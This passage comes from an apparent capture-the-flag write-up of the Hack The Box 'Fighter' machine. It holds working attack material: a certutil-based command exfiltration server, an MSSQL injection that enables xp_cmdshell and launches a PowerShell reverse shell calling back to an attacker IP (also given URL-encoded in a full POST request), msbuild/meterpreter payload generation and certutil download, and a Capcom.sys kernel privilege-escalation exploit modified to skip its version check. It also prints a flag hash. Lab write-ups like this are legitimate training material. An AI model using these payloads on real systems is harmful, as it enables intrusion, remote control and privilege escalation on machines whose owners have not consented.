SimpleHTTPRequestHandler(BaseHTTPRequestHandler):</span><br><span class="line">    def log_request(self, *args, **kwargs):</span><br><span class="line">        <span class="built_in">return</span></span><br><span class="line"></span><br><span class="line">    def log_message(self, *args, **kwargs):</span><br><span class="line">        <span class="built_in">return</span></span><br><span class="line"></span><br><span class="line">    def do_GET(self):</span><br><span class="line">        global query_id</span><br><span class="line">        self.send_error(404)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Certutil sends 2 requets each time</span></span><br><span class="line">        <span class="keyword">if</span> query_id % 2 == 0:</span><br><span class="line">            output = self.path</span><br><span class="line"></span><br><span class="line">            <span class="comment"># if command output, decode it!</span></span><br><span class="line">            <span class="keyword">if</span> output != <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(decode(output[1:]))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># get next command</span></span><br><span class="line">            get_command()</span><br><span class="line"></span><br><span class="line">        query_id += 1</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># Fake server behaviour</span></span><br><span class="line">    handler = SimpleHTTPRequestHandler</span><br><span class="line">    handler.server_version = <span class="string">&#x27;nginx&#x27;</span></span><br><span class="line">    handler.sys_version = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    handler.error_message_format = <span class="string">&#x27;not found&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Add SSL support if you wanna be a ninja!</span></span><br><span class="line">    httpd = MyServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, 80), handler)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        httpd.serve_forever()</span><br><span class="line">    except KeyboardInterrupt:</span><br><span class="line">        pass</span><br><span class="line">    httpd.server_close()</span><br></pre></td></tr></table></figure>

<p>then run the script</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/hackthebox/fighter<span class="comment"># python3 exploit.py </span></span><br><span class="line">:\&gt; whoami</span><br><span class="line">fighter\sqlserv</span><br></pre></td></tr></table></figure>

<p>or use the following payload to spawn a reverse shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1;EXEC sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure <span class="string">&#x27;xP_cmDsHell&#x27;</span>, 1;RECONFIGURE WITH OVERRIDE;drop table <span class="comment">#xxx;create table #xxx (out varchar(8000));Insert into #xxx (out) execute xp_CmDShell &#x27;c:\WinDOWS\SYSWoW64\winDoWSpOwERsHEll\V1.0\PoWerShell.EXE &quot;$client = New-Object System.Net.Sockets.TCPClient(\&quot;10.10.14.3\&quot;,80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + \&quot;PS \&quot; + (pwd).Path + \&quot;^&gt; \&quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;&#x27;;EXEC sp_configure &#x27;xp_cmDsHeLl&#x27;, 0;RECONFIGURE WITH OVERRIDE;</span></span><br></pre></td></tr></table></figure>

<p>url encode the payload then send the request</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /old/verify.asp HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: members.streetfighterclub.htb</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Referer: http://members.streetfighterclub.htb/old/login.asp</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 2627</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Cookie: ASPSESSIONIDASBDQAST=HDDPOADAMCOKAMNDGOGAFGGL</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">username=admin&amp;password=123456&amp;logintype=%31%3b%45%58%45%43%20%73%70%5f%63%6f%6e%66%69%67%75%72%65%20%27%73%68%6f%77%20%61%64%76%61%6e%63%65%64%20%6f%70%74%69%6f%6e%73%27%2c%20%31%3b%52%45%43%4f%4e%46%49%47%55%52%45%20%57%49%54%48%20%4f%56%45%52%52%49%44%45%3b%45%58%45%43%20%73%70%5f%63%6f%6e%66%69%67%75%72%65%20%27%78%50%5f%63%6d%44%73%48%65%6c%6c%27%2c%20%31%3b%52%45%43%4f%4e%46%49%47%55%52%45%20%57%49%54%48%20%4f%56%45%52%52%49%44%45%3b%64%72%6f%70%20%74%61%62%6c%65%20%23%78%78%78%3b%63%72%65%61%74%65%20%74%61%62%6c%65%20%23%78%78%78%20%28%6f%75%74%20%76%61%72%63%68%61%72%28%38%30%30%30%29%29%3b%49%6e%73%65%72%74%20%69%6e%74%6f%20%23%78%78%78%20%28%6f%75%74%29%20%65%78%65%63%75%74%65%20%78%70%5f%43%6d%44%53%68%65%6c%6c%20%27%63%3a%5c%57%69%6e%44%4f%57%53%5c%53%59%53%57%6f%57%36%34%5c%77%69%6e%44%6f%57%53%70%4f%77%45%52%73%48%45%6c%6c%5c%56%31%2e%30%5c%50%6f%57%65%72%53%68%65%6c%6c%2e%45%58%45%20%22%24%63%6c%69%65%6e%74%20%3d%20%4e%65%77%2d%4f%62%6a%65%63%74%20%53%79%73%74%65%6d%2e%4e%65%74%2e%53%6f%63%6b%65%74%73%2e%54%43%50%43%6c%69%65%6e%74%28%5c%22%31%30%2e%31%30%2e%31%34%2e%33%5c%22%2c%38%30%29%3b%24%73%74%72%65%61%6d%20%3d%20%24%63%6c%69%65%6e%74%2e%47%65%74%53%74%72%65%61%6d%28%29%3b%5b%62%79%74%65%5b%5d%5d%24%62%79%74%65%73%20%3d%20%30%2e%2e%36%35%35%33%35%7c%25%7b%30%7d%3b%77%68%69%6c%65%28%28%24%69%20%3d%20%24%73%74%72%65%61%6d%2e%52%65%61%64%28%24%62%79%74%65%73%2c%20%30%2c%20%24%62%79%74%65%73%2e%4c%65%6e%67%74%68%29%29%20%2d%6e%65%20%30%29%7b%3b%24%64%61%74%61%20%3d%20%28%4e%65%77%2d%4f%62%6a%65%63%74%20%2d%54%79%70%65%4e%61%6d%65%20%53%79%73%74%65%6d%2e%54%65%78%74%2e%41%53%43%49%49%45%6e%63%6f%64%69%6e%67%29%2e%47%65%74%53%74%72%69%6e%67%28%24%62%79%74%65%73%2c%30%2c%20%24%69%29%3b%24%73%65%6e%64%62%61%63%6b%20%3d%20%28%69%65%78%20%24%64%61%74%61%20%32%3e%26%31%20%7c%20%4f%75%74%2d%53%74%72%69%6e%67%20%29%3b%24%73%65%6e%64%62%61%63%6b%32%20%3d%20%24%73%65%6e%64%62%61%63%6b%20%2b%20%5c%22%50%53%20%5c%22%20%2b%20%28%70%77%64%29%2e%50%61%74%68%20%2b%20%5c%22%5e%3e%20%5c%22%3b%24%73%65%6e%64%62%79%74%65%20%3d%20%28%5b%74%65%78%74%2e%65%6e%63%6f%64%69%6e%67%5d%3a%3a%41%53%43%49%49%29%2e%47%65%74%42%79%74%65%73%28%24%73%65%6e%64%62%61%63%6b%32%29%3b%24%73%74%72%65%61%6d%2e%57%72%69%74%65%28%24%73%65%6e%64%62%79%74%65%2c%30%2c%24%73%65%6e%64%62%79%74%65%2e%4c%65%6e%67%74%68%29%3b%24%73%74%72%65%61%6d%2e%46%6c%75%73%68%28%29%7d%3b%24%63%6c%69%65%6e%74%2e%43%6c%6f%73%65%28%29%22%27%3b%45%58%45%43%20%73%70%5f%63%6f%6e%66%69%67%75%72%65%20%27%78%70%5f%63%6d%44%73%48%65%4c%6c%27%2c%20%30%3b%52%45%43%4f%4e%46%49%47%55%52%45%20%57%49%54%48%20%4f%56%45%52%52%49%44%45%3b&amp;B1=LogIn</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/hackthebox/fighter<span class="comment"># nc -lvp 80</span></span><br><span class="line">listening on [any] 80 ...</span><br><span class="line">connect to [10.10.14.3] from streetfighterclub.htb [10.10.10.72] 49173</span><br><span class="line">whoami                                          </span><br><span class="line">fighter\sqlserv</span><br><span class="line">PS C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure>

<p>We are not able to find anything on the target machine. So we try to convert our shell into meterpreter but are unable to run any exe file. So there was a firewall that didn’t allow us to run any exe file. We got a reference through this link on how to bypass this. We use the nps payload to create an XML file that will contain our payload (download from following)</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RydXN0ZWRzZWMvbnBzX3BheWxvYWQ=">nps payload<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/nps_payload-master<span class="comment"># python nps_payload.py </span></span><br><span class="line"></span><br><span class="line">                                     (            (</span><br><span class="line">                              ) (    )\        )  )\ )</span><br><span class="line">  (    `  )  (       `  )  ( /( )\ )((_)(   ( /( (()/(</span><br><span class="line">  )\ ) /(/(  )\      /(/(  )(_)|()/( _  )\  )(_)) ((_)</span><br><span class="line"> _(_/(((_)_\((_)    ((_)_\((_)_ )(_)) |((_)((_)_  _| |</span><br><span class="line">| <span class="string">&#x27; \)) &#x27;</span>_ \|_-&lt;    | <span class="string">&#x27;_ \) _` | || | / _ \/ _` / _` |</span></span><br><span class="line"><span class="string">|_||_|| .__//__/____| .__/\__,_|\_, |_\___/\__,_\__,_|</span></span><br><span class="line"><span class="string">      |_|     |_____|_|         |__/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                       v1.03</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        (1)     Generate msbuild/nps/msf payload</span></span><br><span class="line"><span class="string">        (2)     Generate msbuild/nps/msf HTA payload</span></span><br><span class="line"><span class="string">        (99)    Quit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Select a task: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Payload Selection:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        (1)     windows/meterpreter/reverse_tcp</span></span><br><span class="line"><span class="string">        (2)     windows/meterpreter/reverse_http</span></span><br><span class="line"><span class="string">        (3)     windows/meterpreter/reverse_https</span></span><br><span class="line"><span class="string">        (4)     Custom PS1 Payload</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Select payload: 1</span></span><br><span class="line"><span class="string">Enter Your Local IP Address (None): 10.10.14.3</span></span><br><span class="line"><span class="string">Enter the listener port (443): 443</span></span><br><span class="line"><span class="string">[*] Generating PSH Payload...</span></span><br><span class="line"><span class="string">[*] Generating MSF Resource Script...</span></span><br><span class="line"><span class="string">[+] Metasploit resource script written to msbuild_nps.rc                                                </span></span><br><span class="line"><span class="string">[+] Payload written to msbuild_nps.xml</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1. Run &quot;msfconsole -r msbuild_nps.rc&quot; to start listener.</span></span><br><span class="line"><span class="string">2. Choose a Deployment Option (a or b): - See README.md for more information.</span></span><br><span class="line"><span class="string">  a. Local File Deployment:</span></span><br><span class="line"><span class="string">    - %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe &lt;folder_path_here&gt;\msbuild_nps.xml</span></span><br><span class="line"><span class="string">  b. Remote File Deployment:</span></span><br><span class="line"><span class="string">    - wmiexec.py &lt;USER&gt;:&#x27;</span>&lt;PASS&gt;<span class="string">&#x27;@&lt;RHOST&gt; cmd.exe /c start %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\&lt;attackerip&gt;\&lt;share&gt;\msbuild_nps.xml                                                                          </span></span><br><span class="line"><span class="string">3. Hack the Planet!!</span></span><br></pre></td></tr></table></figure>

<p>We move into “c:\users\sqlserv” as we have a shell as user sqlserv.</p>
<p>run the command provided by npc payload to start our listener</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfconsole -r /root/nps_payload-master/msbuild_nps.rc</span></span><br><span class="line">                                                  </span><br><span class="line">                          <span class="comment">########                  #</span></span><br><span class="line">                      <span class="comment">#################            #</span></span><br><span class="line">                   <span class="comment">######################         #</span></span><br><span class="line">                  <span class="comment">#########################      #</span></span><br><span class="line">                <span class="comment">############################</span></span><br><span class="line">               <span class="comment">##############################</span></span><br><span class="line">               <span class="comment">###############################</span></span><br><span class="line">              <span class="comment">###############################</span></span><br><span class="line">              <span class="comment">##############################</span></span><br><span class="line">                              <span class="comment">#    ########   #</span></span><br><span class="line">                 <span class="comment">##        ###        ####   ##</span></span><br><span class="line">                                      <span class="comment">###   ###</span></span><br><span class="line">                                    <span class="comment">####   ###</span></span><br><span class="line">               <span class="comment">####          ##########   ####</span></span><br><span class="line">               <span class="comment">#######################   ####</span></span><br><span class="line">                 <span class="comment">####################   ####</span></span><br><span class="line">                  <span class="comment">##################  ####</span></span><br><span class="line">                    <span class="comment">############      ##</span></span><br><span class="line">                       <span class="comment">########        ###</span></span><br><span class="line">                      <span class="comment">#########        #####</span></span><br><span class="line">                    <span class="comment">############      ######</span></span><br><span class="line">                   <span class="comment">########      #########</span></span><br><span class="line">                     <span class="comment">#####       ########</span></span><br><span class="line">                       <span class="comment">###       #########</span></span><br><span class="line">                      <span class="comment">######    ############</span></span><br><span class="line">                     <span class="comment">#######################</span></span><br><span class="line">                     <span class="comment">#   #   ###  #   #   ##</span></span><br><span class="line">                     <span class="comment">########################</span></span><br><span class="line">                      <span class="comment">##     ##   ##     ##</span></span><br><span class="line">                            https://metasploit.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v5.0.71-dev                          ]</span><br><span class="line">+ -- --=[ 1962 exploits - 1095 auxiliary - 336 post       ]</span><br><span class="line">+ -- --=[ 558 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 7 evasion                                       ]</span><br><span class="line"></span><br><span class="line">[*] Processing /root/nps_payload-master/msbuild_nps.rc <span class="keyword">for</span> ERB directives.</span><br><span class="line">resource (/root/nps_payload-master/msbuild_nps.rc)&gt; use multi/handler</span><br><span class="line">resource (/root/nps_payload-master/msbuild_nps.rc)&gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">resource (/root/nps_payload-master/msbuild_nps.rc)&gt; <span class="built_in">set</span> LHOST 10.10.14.3</span><br><span class="line">LHOST =&gt; 10.10.14.3</span><br><span class="line">resource (/root/nps_payload-master/msbuild_nps.rc)&gt; <span class="built_in">set</span> LPORT 443</span><br><span class="line">LPORT =&gt; 443</span><br><span class="line">resource (/root/nps_payload-master/msbuild_nps.rc)&gt; <span class="built_in">set</span> ExitOnSession <span class="literal">false</span></span><br><span class="line">ExitOnSession =&gt; <span class="literal">false</span></span><br><span class="line">resource (/root/nps_payload-master/msbuild_nps.rc)&gt; <span class="built_in">set</span> EnableStageEncoding <span class="literal">true</span></span><br><span class="line">EnableStageEncoding =&gt; <span class="literal">true</span></span><br><span class="line">resource (/root/nps_payload-master/msbuild_nps.rc)&gt; exploit -j -z</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.3:443</span><br></pre></td></tr></table></figure>
<p>start our python HTTP Server to send our file to the target machine</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/hackthebox/fighter<span class="comment"># ls</span></span><br><span class="line">exploit.py  msbuild_nps.xml  ports</span><br><span class="line">root@kali:~/hackthebox/fighter<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br></pre></td></tr></table></figure>

<p>download the file using certutil.exe on the target machine</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS C:\users\sqlserv&gt; certutil.exe -urlcache -split -f http://10.10.14.3/msbuild_nps.xml msbuild_nps.xml</span><br><span class="line">****  Online  ****</span><br><span class="line">  0000  ...</span><br><span class="line">  1526</span><br><span class="line">CertUtil: -URLCache <span class="built_in">command</span> completed successfully.</span><br><span class="line">PS C:\users\sqlserv&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\users\sqlserv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime     Length Name                              </span><br><span class="line">----                -------------     ------ ----                              </span><br><span class="line">d-r--        03/11/2017     14:11            Contacts                          </span><br><span class="line">d-r--        03/11/2017     14:11            Desktop                           </span><br><span class="line">d-r--        03/11/2017     14:11            Documents                         </span><br><span class="line">d-r--        03/11/2017     14:11            Downloads                         </span><br><span class="line">d-r--        03/11/2017     14:11            Favorites                         </span><br><span class="line">d-r--        03/11/2017     14:11            Links                             </span><br><span class="line">d-r--        03/11/2017     14:11            Music                             </span><br><span class="line">d-r--        03/11/2017     14:11            Pictures                          </span><br><span class="line">d-r--        03/11/2017     14:11            Saved Games                       </span><br><span class="line">d-r--        03/11/2017     14:11            Searches                          </span><br><span class="line">d-r--        03/11/2017     14:11            Videos                            </span><br><span class="line">-a---        04/06/2020     05:55       5414 msbuild_nps.xml</span><br></pre></td></tr></table></figure>

<p>then run the XML file we uploaded using msbuild.exe</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS C:\users\sqlserv&gt; c:\windows\microsoft.net\framework\v4.0.30319\msbuild.exe msbuild_nps.xml</span><br></pre></td></tr></table></figure>

<p>then we got a meterpreter shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : FIGHTER</span><br><span class="line">OS              : Windows 2012 R2 (6.3 Build 9600).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : it_IT</span><br><span class="line">Domain          : WORKGROUP</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x86/windows</span><br></pre></td></tr></table></figure>

<p>To convert 32-bit session into 64-bit session, we check the processes and find the 64-bit running process. We then migrate our process to a 64-bit process and get a 64-bit session.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; ps</span><br><span class="line">2920  1188  cmd.exe                  x64   0        FIGHTER\sqlserv  C:\Windows\System32\cmd.exe</span><br><span class="line">meterpreter &gt; migrate 2920</span><br><span class="line">[*] Migrating from 1800 to 2920...</span><br><span class="line">[*] Migration completed successfully.</span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : FIGHTER</span><br><span class="line">OS              : Windows 2012 R2 (6.3 Build 9600).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : it_IT</span><br><span class="line">Domain          : WORKGROUP</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x64/windows</span><br></pre></td></tr></table></figure>

<p>fantastic!!!</p>
<p>still don’t find anything to escalate our privilege. As this machine on street fighter game, we try to google street fighter exploit and find that street fighter 5 has privilege escalation vulnerability. We find that street fighter has a service called Capcom, so we check if street fighter 5 is installed on the target machine.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 1044 created.</span><br><span class="line">Channel 2 created.</span><br><span class="line">Microsoft Windows [Version 6.3.9600]</span><br><span class="line">(c) 2013 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\users\sqlserv\desktop&gt;sc query capcom</span><br><span class="line">sc query capcom</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: capcom </span><br><span class="line">        TYPE               : 1  KERNEL_DRIVER  </span><br><span class="line">        STATE              : 4  RUNNING </span><br><span class="line">                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)</span><br><span class="line">        WIN32_EXIT_CODE    : 0  (0x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : 0  (0x0)</span><br><span class="line">        CHECKPOINT         : 0x0</span><br><span class="line">        WAIT_HINT          : 0x0</span><br></pre></td></tr></table></figure>

<p>We find this Metasploit exploit here, we try to run it but are unable to get a shell as it gave an error stating that the system was not vulnerable. So we make changes to the code and comment out the section where it checks the OS version.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/hackthebox/fighter<span class="comment"># searchsploit capcom</span></span><br><span class="line">------------------------------------------------------------------------ ----------------------------------------</span><br><span class="line"> Exploit Title                                                          |  Path</span><br><span class="line">                                                                        | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------------------------ ----------------------------------------</span><br><span class="line">Street Fighter 5 - <span class="string">&#x27;Capcom.sys&#x27;</span> Kernel Execution (Metasploit)           | exploits/windows_x86-64/<span class="built_in">local</span>/40451.rb</span><br><span class="line">------------------------------------------------------------------------ ----------------------------------------</span><br></pre></td></tr></table></figure>

<p>now edit the payload, add “#” at the beginning of the line</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">    <span class="string">&#x27;DisclosureDate&#x27;</span>  =&gt; <span class="string">&#x27;Jan 01 1999&#x27;</span>, <span class="comment"># non-vuln exploit date</span></span><br><span class="line">    <span class="string">&#x27;DefaultTarget&#x27;</span>   =&gt; 0</span><br><span class="line">  &#125;))</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">def check</span><br><span class="line">  <span class="comment">#if sysinfo[&#x27;OS&#x27;] !~ /windows (7|8|10)/i</span></span><br><span class="line">    <span class="comment">#return Exploit::CheckCode::Unknown</span></span><br><span class="line">  <span class="comment">#end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> sysinfo[<span class="string">&#x27;Architecture&#x27;</span>] !~ /(wow|x)64/i</span><br><span class="line">    <span class="built_in">return</span> Exploit::CheckCode::Safe</span><br><span class="line">  end</span><br></pre></td></tr></table></figure>

<p>now run the exploit again</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/windows/<span class="built_in">local</span>/capcom_sys_exec</span><br><span class="line">msf exploit(windows/<span class="built_in">local</span>/capcom_sys_exec) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(windows/<span class="built_in">local</span>/capcom_sys_exec) &gt; <span class="built_in">set</span> lhost tun0</span><br><span class="line">msf exploit(windows/<span class="built_in">local</span>/capcom_sys_exec) &gt; <span class="built_in">set</span> lport 80</span><br><span class="line">msf exploit(windows/<span class="built_in">local</span>/capcom_sys_exec) &gt; <span class="built_in">set</span> session 2</span><br><span class="line">msf exploit(windows/<span class="built_in">local</span>/capcom_sys_exec)&gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.3:80 </span><br><span class="line">[*] Launching notepad to host the exploit...</span><br><span class="line">[+] Process 2592 launched.</span><br><span class="line">[*] Reflectively injecting the exploit DLL into 2592...</span><br><span class="line">[*] Injecting exploit into 2592...</span><br><span class="line">[*] Exploit injected. Injecting payload into 2592...</span><br><span class="line">[*] Payload injected. Executing exploit...</span><br><span class="line">[+] Exploit finished, <span class="built_in">wait</span> <span class="keyword">for</span> (hopefully privileged) payload execution to complete.</span><br><span class="line">[*] Sending stage (206403 bytes) to 10.10.10.72</span><br><span class="line">[*] Meterpreter session 3 opened (10.10.14.3:80 -&gt; 10.10.10.72:49187) at 2020-06-04 00:27:24 -0400</span><br></pre></td></tr></table></figure>

<p>now we got system privilege</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : FIGHTER</span><br><span class="line">OS              : Windows 2012 R2 (6.3 Build 9600).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : it_IT</span><br><span class="line">Domain          : WORKGROUP</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x64/windows</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>

<p>then enter a shell and find the flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 120 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [Version 6.3.9600]</span><br><span class="line">(c) 2013 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;<span class="built_in">cd</span> c:\users\decoder\Desktop</span><br><span class="line"><span class="built_in">cd</span> c:\users\decoder\Desktop</span><br><span class="line"></span><br><span class="line">c:\Users\decoder\Desktop&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is BE85-B9AE</span><br><span class="line"></span><br><span class="line"> Directory of c:\Users\decoder\Desktop</span><br><span class="line"></span><br><span class="line">02/05/2018  17:28    &lt;DIR&gt;          .</span><br><span class="line">02/05/2018  17:28    &lt;DIR&gt;          ..</span><br><span class="line">08/01/2018  21:47                34 user.txt</span><br><span class="line">               1 File(s)             34 bytes</span><br><span class="line">               2 Dir(s)  23.804.547.072 bytes free</span><br><span class="line"></span><br><span class="line">c:\Users\decoder\Desktop&gt;<span class="built_in">type</span> user.txt</span><br><span class="line"><span class="built_in">type</span> user.txt</span><br><span class="line">bb6163c184f203af2a31a9c035934297</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb34.jpg"></li>
</ul>
<p>we got user.txt</p>
<p>We move into c:\users\Administrator\Desktop and find a file called “root.exe”. We run it and find that it asks for a password. There is also a DLL file called “checkdll.dll”, as the password might be checked using this DLL file.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">c:\Users\Administrator\Desktop&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is BE85-B9AE</span><br><span class="line"></span><br><span class="line"> Directory of c:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line">08/01/2018  21:44    &lt;DIR&gt;          .</span><br><span class="line">08/01/2018  21:44    &lt;DIR&gt;          ..</span><br><span class="line">24/10/2017  17:02             9.216 checkdll.dll</span><br><span class="line">08/01/2018  23:34             9.728 root.exe</span><br><span class="line">24/10/2017  21:06        13.767.776 vc_redist.x86.exe</span><br><span class="line">               3 File(s)     13.786.720 bytes</span><br><span class="line">               2 Dir(s)  23.804.547.072 bytes free</span><br><span class="line"></span><br><span class="line">c:\Users\Administrator\Desktop&gt;root.exe</span><br><span class="line">root.exe</span><br><span class="line">root.exe &lt;password&gt;</span><br></pre></td></tr></table></figure>

<p>We download both the files into our system using meterpreter.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">cd</span> Users/Administrator/Desktop</span><br><span class="line">meterpreter &gt; <span class="built_in">pwd</span></span><br><span class="line">C:\Users\Administrator\Desktop</span><br><span class="line">meterpreter &gt; download root.exe /root/hackthebox/fighter</span><br><span class="line">[*] Downloading: root.exe -&gt; /root/hackthebox/fighter/root.exe</span><br><span class="line">[*] Downloaded 9.50 KiB of 9.50 KiB (100.0%): root.exe -&gt; /root/hackthebox/fighter/root.exe</span><br><span class="line">[*] download   : root.exe -&gt; /root/hackthebox/fighter/root.exe</span><br><span class="line">meterpreter &gt; download checkdll.dll /root/hackthebox/fighter</span><br><span class="line">[*] Downloading: checkdll.dll -&gt; /root/hackthebox/fighter/checkdll.dll</span><br><span class="line">[*] Downloaded 9.00 KiB of 9.00 KiB (100.0%): checkdll.dll -&gt; /root/hackthebox/fighter/checkdll.dll</span><br><span class="line">[*] download   : checkdll.dll -&gt; /root/hackthebox/fighter/checkdll.dll</span><br></pre></td></tr></table></figure>

<p>reverse engineer them using IDA and find that this program XOR’s 9 with each character of the variable aFmFeholH. Now analyzing with IDA tells us that the variable contains “FmfEhO1}h”.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">public check</span><br><span class="line">check proc near</span><br><span class="line"></span><br><span class="line">arg_0= dword ptr  8</span><br><span class="line"></span><br><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">mov     edx, [ebp+arg_0]</span><br><span class="line">xor     eax, eax</span><br><span class="line">sub     edx, offset aFmFeholH ; <span class="string">&quot;Fm`fEhOl&#125;h&quot;</span></span><br><span class="line">xchg    ax, ax</span><br></pre></td></tr></table></figure>

<p>伪代码</p>
